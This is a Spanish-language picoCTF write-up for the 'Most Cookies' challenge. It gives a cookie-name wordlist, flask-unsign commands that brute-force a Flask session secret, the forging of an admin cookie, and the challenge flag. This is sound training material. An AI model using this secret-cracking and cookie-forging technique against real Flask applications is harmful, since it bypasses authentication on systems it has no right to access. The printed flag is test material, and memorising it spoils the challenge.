# Nombre del reto
>Most Cookies

---
# Descripción
>Alright, enough of using my own encryption. Flask session cookies should be plenty secure!
>[http://wily-courier.picoctf.net:50427/](http://wily-courier.picoctf.net:50427/)

---
# Solución
Para esto, debemos de tener en cuenta una gran limitante, y es que hace poco fue eliminado el archivo de python que contiene la lista de palabras para estas cookies, como para resolverlo se necesita la lista de palabras, aquí se encuentran las palabras:

Para esto, se necesita hacer un `nano cookies.txt` para poder usarlo más adelante
```plain text
snickerdoodle
chocolate
chip
oatmeal
gingersnap
shortbread
fortune
gingerbread
sugar
molasses
cornflake
apple
garibaldi
benne
butter
biscuiti
acorn
leaf
peanut
butter
resurreccion
allspice
bell
corn
fudge
lard
liquid
mustard
roast
oregano
pumpkin
sesame
snapper
tea
whitney
ham
mace
rhubarb
onion
bacon
black
pepper
chive
caramel
cornmeal
fig
apple
pie
pastry
chocolate
cherry
pecan
maple
tobacco
silver
apple
fritter
biscos
marshmallow
aduro
```
Ahora, para resolverlo, debemos de usar una herramienta que forma parte de python, pero para usarla en nuestra terminal de kali debemos de realizar un entorno virtual y después instalarlo, algo así:
```bash
python -m venv venv && source venv/bin/activate
python3 -m pip install flask-unsign 
```
Una vez que lo hemos instalado, debemos de saber que cookie es la que nos está mandando, por ejemplo, en mi caso, al introducir snickerdoodle me da la cookie: `eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aajQmw.9GkfLaW3NGNPhEG6wxExj7H_yh4` entonces, lo que se va a hacer es primero identificar cual es nuestra clave:
``` bash
flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.aajMUw.kgWMAGKOHmIEbf7XTH2OYK-ri9Q" --wordlist cookies.txt
```
Una vez que se hace, nos dará una salida parecida a esto:
```
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 55 attempts
'sugar'
```
La palabra secreta en mi caso fue "sugar", entonces ahora solo nos queda decirle al server que somos admin.
```bash
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "sugar"
```
Y esto nos dará una cookie larga como la que tuvimos al encontrar las cookies de nuestro snickerdoodle, ahora lo que se hace es introducirla, lo que nos da la flag.

---
# Flag del reto
>picoCTF{cO0ki3s_yum_485f560e}

---
# Notas adicionales

---
# Referencias

[Flask cookies](https://chatgpt.com/share/69a8cf3c-1c8c-800b-9d87-55bf99bce969).
Video donde se muestra el [archivo de python](https://youtu.be/ufs1xqSQCUM?si=K0fVYLgQpL5xcEmI)